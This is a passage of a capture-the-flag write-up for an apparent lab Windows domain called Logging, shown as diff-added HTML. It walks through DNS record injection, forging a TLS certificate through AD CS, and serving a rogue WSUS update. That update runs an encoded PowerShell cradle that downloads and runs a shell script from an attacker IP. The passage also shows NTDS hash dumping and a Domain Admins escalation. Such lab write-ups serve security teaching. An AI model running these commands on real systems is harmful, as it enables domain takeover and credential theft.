+    </span><span class="n">WUStatusServer</span><span class="w">    </span><span class="n">REG_SZ</span><span class="w">    </span><span class="p">[</span><span class="n">https</span><span class="p">:</span><span class="n">//wsus.logging.htb:8531</span><span class="p">](</span><span class="n">https</span><span class="p">:</span><span class="n">//wsus.logging.htb:8531</span><span class="p">)</span><span class="w">
+    </span><span class="n">UpdateServiceUrlAlternate</span><span class="w">    </span><span class="n">REG_SZ</span><span class="w">    </span><span class="p">[</span><span class="n">https</span><span class="p">:</span><span class="n">//wsus.logging.htb:8531</span><span class="p">](</span><span class="n">https</span><span class="p">:</span><span class="n">//wsus.logging.htb:8531</span><span class="p">)</span><span class="w">
+
+</span><span class="n">HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU</span><span class="w">
+    </span><span class="nx">AUOptions</span><span class="w">    </span><span class="nx">REG_DWORD</span><span class="w">    </span><span class="nx">0x4</span><span class="w">
+    </span><span class="n">NoAutoUpdate</span><span class="w">    </span><span class="n">REG_DWORD</span><span class="w">    </span><span class="mi">0</span><span class="n">x0</span><span class="w">
+    </span><span class="n">AutomaticMaintenanceEnabled</span><span class="w">    </span><span class="n">REG_DWORD</span><span class="w">    </span><span class="mi">0</span><span class="n">x1</span><span class="w">
+    </span><span class="n">ScheduledInstallDay</span><span class="w">    </span><span class="n">REG_DWORD</span><span class="w">    </span><span class="mi">0</span><span class="n">x0</span><span class="w">
+    </span><span class="n">ScheduledInstallEveryWeek</span><span class="w">    </span><span class="n">REG_DWORD</span><span class="w">    </span><span class="mi">0</span><span class="n">x1</span><span class="w">
+    </span><span class="n">ScheduledInstallTime</span><span class="w">    </span><span class="n">REG_DWORD</span><span class="w">    </span><span class="mi">0</span><span class="n">x3</span><span class="w">
+    </span><span class="n">UseWUServer</span><span class="w">    </span><span class="n">REG_DWORD</span><span class="w">    </span><span class="mi">0</span><span class="n">x1</span><span class="w">
+</span></code></pre></div></div>
+
+<p><strong>Technical Analysis:</strong>
+The registry output validates the sysadmin’s notes and provides the exact connection parameters:</p>
+<ul>
+  <li><strong><code class="language-plaintext highlighter-rouge">UseWUServer</code> (0x1):</strong> Confirms the Domain Controller is actively configured to use a custom update server rather than Microsoft’s default internet servers.</li>
+  <li><strong><code class="language-plaintext highlighter-rouge">WUServer</code> / <code class="language-plaintext highlighter-rouge">WUStatusServer</code>:</strong> Explicitly defines the target endpoint as <code class="language-plaintext highlighter-rouge">https://wsus.logging.htb:8531</code>.</li>
+</ul>
+
+<p>This confirms the machine is fetching updates from the internal hostname over <strong>HTTPS (port 8531)</strong>. Because the connection requires TLS encryption, a standard plaintext WSUS spoofing attack (port 8530) will not work out of the box. The Domain Controller will reject our rogue updates unless we can successfully spoof the TLS connection or downgrade the process.</p>
+
+<h2 id="63-dns-hijacking-via-impacket-dnstoolpy">6.3 DNS Hijacking via Impacket (dnstool.py)</h2>
+
+<p>With the target WSUS endpoint identified, our next step is to hijack the DNS resolution for <code class="language-plaintext highlighter-rouge">wsus.logging.htb</code>. While we could modify the local <code class="language-plaintext highlighter-rouge">hosts</code> file via our reverse shell, a more robust method is to inject a malicious A-record directly into the Active Directory DNS zone. We can achieve this remotely using the compromised <code class="language-plaintext highlighter-rouge">svc_recovery</code> account credentials.</p>
+
+<p>Because the Domain Controller’s clock is significantly skewed (set to April 2026), we must wrap our Impacket commands with a <code class="language-plaintext highlighter-rouge">fake_time</code> script to synchronize our Kerberos requests, preventing authentication failures due to time desynchronization.</p>
+
+<p>First, we request a Ticket Granting Ticket (TGT) for the <code class="language-plaintext highlighter-rouge">svc_recovery</code> user:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ fake_time dc01.logging.htb <span class="se">\</span>
+getTGT.py <span class="s1">'logging.htb/svc_recovery:Em3rg3ncyPa$$2026'</span>
+</code></pre></div></div>
+
+<p>Next, we export the resulting ccache file and execute <code class="language-plaintext highlighter-rouge">dnstool.py</code> to add an A-record pointing <code class="language-plaintext highlighter-rouge">wsus.logging.htb</code> to our attacker IP (<code class="language-plaintext highlighter-rouge">10.10.16.25</code>):</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ <span class="nb">env </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>svc_recovery.ccache <span class="se">\</span>
+fake_time dc01.logging.htb <span class="se">\</span>
+dnstool <span class="se">\</span>
+    <span class="nt">-u</span> <span class="s1">'logging.htb\svc_recovery'</span> <span class="nt">-k</span> <span class="se">\</span>
+    <span class="nt">--action</span> add <span class="se">\</span>
+    <span class="nt">--type</span> A <span class="se">\</span>
+    <span class="nt">--record</span> wsus.logging.htb <span class="se">\</span>
+    <span class="nt">--zone</span> logging.htb <span class="se">\</span>
+    <span class="nt">--data</span> <span class="nv">$attacker_ip</span> <span class="se">\</span>
+    <span class="nt">-dns-ip</span> <span class="nv">$target_ip</span> <span class="se">\</span>
+    dc01.logging.htb
+
+...[snip]...
+<span class="o">[</span>-] Connecting to host...
+<span class="o">[</span>-] Binding to host
+<span class="o">[</span>+] Bind OK
+<span class="o">[</span>-] Adding new record
+<span class="o">[</span>+] LDAP operation completed successfully
+</code></pre></div></div>
+
+<p>Finally, we switch back to our <code class="language-plaintext highlighter-rouge">jaylee.clifton</code> PowerShell session on the Domain Controller and use <code class="language-plaintext highlighter-rouge">nslookup</code> to verify that the system is now resolving the spoofed DNS record:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">nslookup</span><span class="w"> </span><span class="nx">wsus.logging.htb</span><span class="w">
+</span><span class="n">Server:</span><span class="w">  </span><span class="nx">localhost</span><span class="w">
+</span><span class="n">Address:</span><span class="w">  </span><span class="nx">127.0.0.1</span><span class="w">
+
+</span><span class="n">Name:</span><span class="w">    </span><span class="nx">wsus.logging.htb</span><span class="w">
+</span><span class="n">Address:</span><span class="w">  </span><span class="nx">10.10.16.25</span><span class="w">
+</span></code></pre></div></div>
+
+<p>The target is now primed to route all WSUS update requests directly to our attacker machine.</p>
+
+<h2 id="64-tls-certificate-generation-ad-cs">6.4 TLS Certificate Generation (AD CS)</h2>
+
+<p>As discovered in the registry enumeration, the Domain Controller expects to communicate with the WSUS server over HTTPS (port 8531). If we attempt to spoof the WSUS server without a trusted TLS certificate, the Windows Update client will reject the connection.</p>
+
+<p>To bypass this, we can abuse Active Directory Certificate Services (AD CS). Since <code class="language-plaintext highlighter-rouge">jaylee.clifton</code> is a domain user, we can request a valid certificate from the domain’s Certificate Authority. We upload <code class="language-plaintext highlighter-rouge">Certify.exe</code> to the target and request a certificate using the <code class="language-plaintext highlighter-rouge">UpdateSrv</code> template, explicitly setting the Subject Alternative Name (DNS) to our spoofed endpoint: <code class="language-plaintext highlighter-rouge">wsus.logging.htb</code>.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\Certify.exe</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="se">`
+</span><span class="nt">--ca</span><span class="w"> </span><span class="s2">"DC01.logging.htb\logging-DC01-CA"</span><span class="w"> </span><span class="se">`
+</span><span class="nt">--template</span><span class="w"> </span><span class="nx">UpdateSrv</span><span class="w"> </span><span class="se">`
+</span><span class="nt">--dns</span><span class="w"> </span><span class="nx">wsus.logging.htb</span><span class="w">
+
+    </span><span class="err">_____</span><span class="w">         </span><span class="err">_</span><span class="w">   </span><span class="err">_</span><span class="w">  </span><span class="err">__</span><span class="w">
+   </span><span class="n">/</span><span class="w"> </span><span class="nx">____</span><span class="o">|</span><span class="w">       </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="p">(</span><span class="err">_</span><span class="p">)</span><span class="n">/</span><span class="w"> </span><span class="nx">_</span><span class="o">|</span><span class="w">
+  </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w">     </span><span class="err">___</span><span class="w"> </span><span class="err">_</span><span class="w"> </span><span class="err">__</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="err">_</span><span class="w"> </span><span class="err">_</span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="err">_</span><span class="w"> </span><span class="err">_</span><span class="w">   </span><span class="err">_</span><span class="w">
+  </span><span class="o">|</span><span class="w"> </span><span class="o">|</span><span class="w">    </span><span class="n">/</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="nx">\</span><span class="w"> </span><span class="s1">'__| __| |  _| | | |
+  | |___|  __/ |  | |_| | | | |_| |
+   \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+   v2.0.0
+
+[*] Action: Request a certificate
+
+[*] Current user context    : logging\jaylee.clifton
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : UpdateSrv
+[*] Subject                 : CN=jaylee.clifton, CN=Users, DC=logging, DC=htb
+[*] Subject Alt Name(s)     : wsus.logging.htb
+
+[*] Certificate Authority   : DC01.logging.htb\logging-DC01-CA
+[*] CA Response             : The certificate has been issued.
+[*] Request ID              : 7
+
+[*] Certificate (PFX)       :
+
+MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqhkiG9w0BBwGggCSABIID6DCCBW....[snip]...AYQB5AGwAZQBlAC4AYwBsAGkAZgB0AG8AbgAAAAAAAAAAAAAAAAAAAAA=
+
+Certify completed in 00:00:04.5711375
+</span></code></pre></div></div>
+
+<p>The CA successfully issues the certificate because it trusts the domain user and the template allows SAN specification. <code class="language-plaintext highlighter-rouge">Certify.exe</code> outputs the certificate and private key as a Base64-encoded PFX blob. Our next step is to convert this PFX into usable PEM formats for our rogue WSUS server.</p>
+
+<h2 id="65-certificate-preparation">6.5 Certificate Preparation</h2>
+
+<p>We copy the Base64-encoded PFX blob provided by <code class="language-plaintext highlighter-rouge">Certify.exe</code> and decode it on our attacker machine, saving the binary output as <code class="language-plaintext highlighter-rouge">wsus.pfx</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ <span class="nb">echo</span> <span class="s1">'MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA....[snip]...AYQB5AGwAZQBlAC4AYwBsAGkAZgB0AG8AbgAAAAAAAAAAAAAAAAAAAAA='</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> wsus.pfx
+</code></pre></div></div>
+
+<p>This gives us the raw PKCS#12 archive containing both the spoofed certificate and its associated private key. To use this with our rogue WSUS server (which expects PEM formatting), we will need to extract the key and certificate from this archive.</p>
+
+<h2 id="66-pem-extraction-certipy">6.6 PEM Extraction (Certipy)</h2>
+
+<p>To extract the usable components from our <code class="language-plaintext highlighter-rouge">wsus.pfx</code> archive, we utilize <code class="language-plaintext highlighter-rouge">certipy</code>. We run the tool twice: first to extract the public certificate (<code class="language-plaintext highlighter-rouge">-nokey</code>), and then to extract the private key (<code class="language-plaintext highlighter-rouge">-nocert</code>).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ certipy cert <span class="nt">-pfx</span> wsus.pfx <span class="nt">-nokey</span> <span class="nt">-out</span> wsus.crt
+Certipy v5.0.4 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Data written to <span class="s1">'wsus.crt'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Writing certificate to <span class="s1">'wsus.crt'</span>
+
+➜ certipy cert <span class="nt">-pfx</span> wsus.pfx <span class="nt">-nocert</span> <span class="nt">-out</span> wsus.key
+Certipy v5.0.4 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Data written to <span class="s1">'wsus.key'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Writing private key to <span class="s1">'wsus.key'</span>
+</code></pre></div></div>
+
+<p>Finally, we concatenate the certificate and the private key into a single <code class="language-plaintext highlighter-rouge">wsus.pem</code> file. This combined file is exactly what our rogue WSUS server needs to successfully spoof the TLS connection and serve the malicious update over HTTPS (port 8531) without triggering trust errors on the target.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ <span class="nb">cat </span>wsus.crt wsus.key <span class="o">&gt;</span> wsus.pem
+</code></pre></div></div>
+
+<h2 id="67-rogue-wsus-exploitation--system-shell">6.7 Rogue WSUS Exploitation &amp; SYSTEM Shell</h2>
+
+<p>To ensure the rogue WSUS server handles the incoming HTTP Host headers correctly, we first map the spoofed domain to <code class="language-plaintext highlighter-rouge">127.0.0.1</code> in our attacker machine’s local <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ <span class="nb">echo</span> <span class="s2">"127.0.0.1 wsus.logging.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+127.0.0.1 wsus.logging.htb
+</code></pre></div></div>
+
+<p>We then stage a Netcat listener to catch the final SYSTEM callback.</p>
+
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ rlwrap <span class="nt">-cAr</span> ncat <span class="nt">-lnvp</span> 9295
+</code></pre></div></div>
+
+<p>With the listener ready and our valid <code class="language-plaintext highlighter-rouge">wsus.pem</code> TLS certificate prepared, we launch <strong>wsuks</strong> to act as the malicious update server. We instruct it to serve Microsoft’s <code class="language-plaintext highlighter-rouge">PsExec64.exe</code> as a fake update, passing arguments to execute a Base64-encoded PowerShell reverse shell cradle as the SYSTEM account (<code class="language-plaintext highlighter-rouge">/s</code>).</p>
+
+<p>Within 120 seconds, the Domain Controller’s scheduled <code class="language-plaintext highlighter-rouge">ForceSync</code> task triggers. The Windows Update client connects to our server over HTTPS (port 8531), accepts our generated certificate, and requests the update catalog. It automatically downloads and executes our payload.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ <span class="nb">sudo </span>wsuks <span class="nt">--serve-only</span> <span class="se">\</span>
+    <span class="nt">--WSUS-Server</span> wsus.logging.htb <span class="se">\</span>
+    <span class="nt">--tls-cert</span> wsus.pem <span class="se">\</span>
+    <span class="nt">-I</span> tun0 <span class="se">\</span>
+    <span class="nt">-c</span> <span class="s1">'/accepteula /s powershell.exe -ep bypass -nop -w hidden -e "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADIAMQA0AC8AcwBoAGUAbABsAC4AcABzADEAIgApAA=="'</span>
+
+<span class="o">[</span>+] Command to execute:
+PsExec64.exe /accepteula /s powershell.exe <span class="nt">-ep</span> bypass <span class="nt">-nop</span> <span class="nt">-w</span> hidden <span class="nt">-e</span> <span class="s2">"SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADIAMQA0AC8AcwBoAGUAbABsAC4AcABzADEAIgApAA=="</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">=====</span> Starting Web Server <span class="o">=====</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using TLS certificate <span class="s1">'wsus.pem'</span> <span class="k">for </span>HTTPS WSUS Server
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting WSUS Server on 10.10.16.25:8531...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Serving executable as KB: 4267809
+<span class="o">[</span>+] Received POST request: /ClientWebService/client.asmx, SOAP Action: <span class="s2">"[http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig](http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig)"</span>
+<span class="o">[</span>+] Received POST request: /ClientWebService/client.asmx, SOAP Action: <span class="s2">"[http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie](http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie)"</span>
+<span class="o">[</span>+] Received POST request: /ClientWebService/client.asmx, SOAP Action: <span class="s2">"[http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/SyncUpdates](http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/SyncUpdates)"</span>
+<span class="o">[</span>+] Received POST request: /ClientWebService/client.asmx, SOAP Action: <span class="s2">"[http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie](http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie)"</span>
+<span class="o">[</span>+] Received POST request: /ClientWebService/client.asmx, SOAP Action: <span class="s2">"[http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetExtendedUpdateInfo](http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetExtendedUpdateInfo)"</span>
+<span class="o">[</span>+] Received GET request: /4baf9853-d2e9-42c8-856c-342a5d11ddda/PsExec64.exe
+<span class="o">[</span>+] GET request <span class="k">for </span>exe: /4baf9853-d2e9-42c8-856c-342a5d11ddda/PsExec64.exe
+<span class="nt">----------------------------------------</span>
+...[snip]...
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Note</strong>:</p>
+
+  <p>While the <code class="language-plaintext highlighter-rouge">ForceSync</code> scheduled task on this machine is configured to run every 120 seconds, waiting for a timer in a live engagement is not always ideal. On modern Windows systems (Server 2016/2019 and Windows 10+), the <strong>Update Session Orchestrator (USO)</strong> has replaced the older <code class="language-plaintext highlighter-rouge">wuauclt.exe</code> utility.</p>
+
+  <p>To force the Domain Controller to check for updates immediately and connect to our rogue WSUS server, we can use the <strong>UsoClient</strong> utility from our initial shell:</p>
+
+  <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">UsoClient</span><span class="w"> </span><span class="nx">StartScan</span><span class="w">
+</span></code></pre></div>  </div>
+</blockquote>
+
+<p>Simultaneously, our Netcat listener catches the callback. We verify our privileges and successfully compromise the Domain Controller, allowing us to retrieve the final root flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami</span><span class="p">;</span> <span class="nb">hostname
+</span>nt authority<span class="se">\s</span>ystem
+DC01
+</code></pre></div></div>
+
+<p>A quick enumeration of the <code class="language-plaintext highlighter-rouge">C:\Users</code> directory reveals that the final objective is not in the default Administrator folder. Instead, we locate and retrieve the root flag from <code class="language-plaintext highlighter-rouge">toby.brynleigh</code>’s Desktop.</p>
+
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers&gt; tree <span class="nb">.</span> /a /f
+Folder PATH listing
+Volume serial number is C007-7498
+...[snip]...
+
+C:<span class="se">\U</span>SERS
+<span class="se">\-</span><span class="nt">--toby</span>.brynleigh
+    +---3D Objects
+    +---Contacts
+    +---Desktop
+    |       root.txt
+
+PS C:<span class="se">\U</span>sers&gt; <span class="nb">type </span>toby.brynleigh<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+<span class="o">[</span>REDACTED]
+</code></pre></div></div>
+
+<h2 id="68-epilogue-full-domain-dominance-ntds-dump">6.8 Epilogue: Full Domain Dominance (NTDS Dump)</h2>
+
+<p>Although we have already secured the root flag and effectively compromised the Domain Controller, a true penetration test often requires demonstrating full domain dominance by extracting all Active Directory credentials.</p>
+
+<p>To achieve this, we can leverage our existing <code class="language-plaintext highlighter-rouge">SYSTEM</code> shell to modify the built-in Domain Administrator account. First, we reset the Administrator password to a known value (<code class="language-plaintext highlighter-rouge">Password123!</code>).</p>
+
+<p>However, simply resetting the password might not be enough for remote dumping if the account is part of the <strong>Protected Users</strong> group, which restricts NTLM authentication and prevents certain credential delegation. To ensure our remote tools can authenticate cleanly, we remove the Administrator from this group:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">Administrator</span><span class="w"> </span><span class="nx">Password123</span><span class="o">!</span><span class="w">
+</span><span class="n">The</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">completed</span><span class="w"> </span><span class="nx">successfully.</span><span class="w">
+
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Remove-ADGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"Protected Users"</span><span class="w"> </span><span class="nt">-Members</span><span class="w"> </span><span class="s2">"Administrator"</span><span class="w"> </span><span class="nt">-Confirm</span><span class="p">:</span><span class="bp">$false</span><span class="w">
+</span></code></pre></div></div>
+
+<p>With the password reset and the protection removed, we can pivot back to our attacker machine. We use <strong>NetExec</strong> (formerly CrackMapExec) to authenticate over SMB as the Domain Administrator and dump the <code class="language-plaintext highlighter-rouge">NTDS.dit</code> file—the database containing every username and password hash in the Active Directory environment.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ nxc smb dc01.logging.htb <span class="se">\</span>
+        <span class="nt">-u</span> administrator <span class="nt">-p</span> <span class="s1">'Password123!'</span> <span class="se">\</span>
+        <span class="nt">--ntds</span>
+SMB         10.129.245.130    445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:logging.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:None<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
+SMB         10.129.245.130    445    DC01             <span class="o">[</span>+] logging.htb<span class="se">\a</span>dministrator:Password123! <span class="o">(</span>Pwn3d!<span class="o">)</span>
+SMB         10.129.245.130    445    DC01             <span class="o">[</span>+] Dumping the NTDS, this could take a <span class="k">while </span>so go grab a redbull...
+SMB         10.129.245.130    445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+SMB         10.129.245.130    445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.129.245.130    445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:66ff41c8e28783a47fd7617f1f0125f0:::
+SMB         10.129.245.130    445    DC01             logging.htb<span class="se">\s</span>vc_recovery:2104:aad3b435b51404eeaad3b435b51404ee:fbeb47c9c100020d3b9ebaf1ce839fb3:::
+SMB         10.129.245.130    445    DC01             logging.htb<span class="se">\j</span>aylee.clifton:2105:aad3b435b51404eeaad3b435b51404ee:1abff5519c569c11dc713706b4a15ae0:::
+SMB         10.129.245.130    445    DC01             logging.htb<span class="se">\m</span>onique.chip:2106:aad3b435b51404eeaad3b435b51404ee:5595521651b7510b86438f7452606abf:::
+SMB         10.129.245.130    445    DC01             logging.htb<span class="se">\k</span>yson.abel:2107:aad3b435b51404eeaad3b435b51404ee:a50981f25606aeaa0d442f0fcbbce699:::
+SMB         10.129.245.130    445    DC01             logging.htb<span class="se">\f</span>able.milford:2108:aad3b435b51404eeaad3b435b51404ee:26a4b1da75600cdd7a3d77789d40a889:::
+SMB         10.129.245.130    445    DC01             logging.htb<span class="se">\w</span>ellington.kylan:2109:aad3b435b51404eeaad3b435b51404ee:20a6efc7a20a14021a717fa06cd250f8:::
+SMB         10.129.245.130    445    DC01             logging.htb<span class="se">\s</span>erina.philander:2110:aad3b435b51404eeaad3b435b51404ee:42961be97eb21e2fa7664b115e2ac3af:::
+SMB         10.129.245.130    445    DC01             logging.htb<span class="se">\w</span>allace.everette:2111:aad3b435b51404eeaad3b435b51404ee:40e28a964e1a6a6512d0ebc70f1ca811:::
+SMB         10.129.245.130    445    DC01             logging.htb<span class="se">\t</span>oby.brynleigh:2112:aad3b435b51404eeaad3b435b51404ee:ac384497550a56937cd6edd784fb221c:::
+SMB         10.129.245.130    445    DC01             DC01<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:b4d05e08453f856b0ff4af1125157a84:::
+SMB         10.129.245.130    445    DC01             msa_health<span class="nv">$:</span>2113:aad3b435b51404eeaad3b435b51404ee:603fc24ee01a9409f83c9d1d701485c5:::
+</code></pre></div></div>
+
+<p>At this point, we own the network and every account within it, completing the total compromise of the <code class="language-plaintext highlighter-rouge">logging.htb</code> domain.</p>
+
+<hr />
+
+<h1 id="7-conclusion">7. Conclusion</h1>
+
+<p>The <strong>Logging</strong> machine presents a highly realistic Windows environment that highlights the dangers of combining “temporary” IT workarounds with underlying Active Directory misconfigurations. The attack path required a solid understanding of Windows internal networking, Active Directory Certificate Services (AD CS), and the mechanics of Windows Server Update Services (WSUS).</p>
+
+<h3 id="summary-of-the-attack-path">Summary of the Attack Path</h3>
+<ol>
+  <li><strong>Initial Access:</strong> Leveraging exposed or weak credentials to gain a foothold via WinRM, eventually dumping the local SAM to extract the <code class="language-plaintext highlighter-rouge">msa_health$</code> machine account hash.</li>
+  <li><strong>Local Enumeration:</strong> Discovering a support ticket in a user’s directory detailing a hacky, automated WSUS workaround (<code class="language-plaintext highlighter-rouge">ForceSync</code> scheduled task) pointing to a staging endpoint (<code class="language-plaintext highlighter-rouge">wsus.logging.htb</code>).</li>
+  <li><strong>DNS Hijacking:</strong> Abusing excessive permissions on the <code class="language-plaintext highlighter-rouge">svc_recovery</code> account to inject a malicious A-record into the Active Directory DNS zone, pointing the staging endpoint to our attacker IP.</li>
+  <li><strong>AD CS Abuse (ESC17):</strong> Exploiting a vulnerable certificate template (<code class="language-plaintext highlighter-rouge">UpdateSrv</code>) that allowed unprivileged users to specify arbitrary Subject Alternative Names (SANs). This allowed us to forge a valid TLS certificate for the spoofed WSUS domain.</li>
+  <li><strong>Privilege Escalation &amp; Domain Dominance:</strong> Standing up a rogue WSUS server equipped with the forged certificate to hijack the automated update task. This allowed for two distinct paths to full compromise:
+    <ul>
+      <li><strong>Path A (Interactive):</strong> Serving a malicious <code class="language-plaintext highlighter-rouge">PsExec64.exe</code> binary bundled with a reverse shell to catch an interactive <strong>NT AUTHORITY\SYSTEM</strong> session, allowing us to reset the Administrator password and dump the NTDS.</li>
+      <li><strong>Path B (Stealth):</strong> Serving a Base64-encoded PowerShell command via PsExec to silently add the previously compromised <code class="language-plaintext highlighter-rouge">msa_health$</code> account to the <strong>Domain Admins</strong> group, enabling immediate Pass-the-Hash (PtH) and NTDS extraction.</li>
+    </ul>
+  </li>
+</ol>
+
+<hr />
+
+<h1 id="8-appendix">8. Appendix</h1>
+
+<h2 id="appendix-a-alternative-privilege-escalation-path-direct-domain-dominance">Appendix A: Alternative Privilege Escalation Path (Direct Domain Dominance)</h2>
+
+<p>If you prefer a stealthier approach—or want to avoid catching an interactive reverse shell and manually resetting the Administrator password—you can modify the rogue WSUS payload to directly elevate an account we already control.</p>
+
+<p>Since we previously extracted the NTLM hash for the <code class="language-plaintext highlighter-rouge">msa_health$</code> machine account, we can instruct the <code class="language-plaintext highlighter-rouge">ForceSync</code> task to execute a PowerShell command that adds <code class="language-plaintext highlighter-rouge">MSA_HEALTH$</code> directly to the <strong>Domain Admins</strong> group.</p>
+
+<p>First, we craft the PowerShell command and encode it in Base64 (UTF-16LE) to avoid parsing errors in the command line:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ <span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'Add-ADGroupMember -Identity "Domain Admins" -Members "MSA_HEALTH$"'</span> | iconv <span class="nt">-t</span> UTF-16LE | <span class="nb">base64</span> <span class="nt">-w0</span>
+QQBkAGQALQBBAEQARwByAG8AdQBwAE0AZQBtAGIAZQByACAALQBJAGQAZQBuAHQAaQB0AHkAIAAiAEQAbwBtAGEAaQBuACAAQQBkAG0AaQBuAHMAIgAgAC0ATQBlAG0AYgBlAHIAcwAgACIATQBTAEEAXwBIAEUAQQBMAFQASAAkACIA
+</code></pre></div></div>
+
+<p>Next, just like in our previous attack, we map the spoofed domain locally and launch <code class="language-plaintext highlighter-rouge">wsuks</code>, passing our newly encoded command to PsExec:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜ <span class="nb">echo</span> <span class="s2">"127.0.0.1 wsus.logging.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+127.0.0.1 wsus.logging.htb
+
+➜ <span class="nb">sudo </span>wsuks <span class="nt">--serve-only</span> <span class="se">\</span>
+    <span class="nt">--WSUS-Server</span> wsus.logging.htb <span class="se">\</span>
+    <span class="nt">--tls-cert</span> wsus.pem <span class="se">\</span>
+    <span class="nt">-I</span> tun0 <span class="se">\</span>
